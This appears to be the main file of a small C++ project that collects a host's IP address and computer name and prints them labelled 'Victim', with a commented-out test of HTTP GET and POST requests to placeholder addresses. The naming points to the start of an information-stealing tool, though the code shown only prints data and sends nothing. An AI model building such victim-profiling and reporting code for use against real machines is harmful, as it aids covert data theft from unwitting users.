#include <iostream>
#include <string>
#include "NetworkOperations.h"
#include "CollectSystemData.h"
#include "Helper.h"


int main() {
    // network testing part
    /* std::string url, post_url;
    url = "http://www.example.net";
    post_url = "http://0.0.0.0:9000/";

    std::map<std::string, std::string> data;
    data.insert(std::pair<std::string, std::string>("user", "test"));
    printDataMap(data);
    int get_result = myget(url);
    int post_result = mypost(post_url, data);
    std::cout << "GET status-code: " << get_result << ".\n" << std::endl;
    */

    auto dc = SystemDataCollector();
    std::cout << "Victim IP: " << dc.getIP() << "\nVictim computer name: " << dc.getComputerName() << "\n";

    return 0;
}
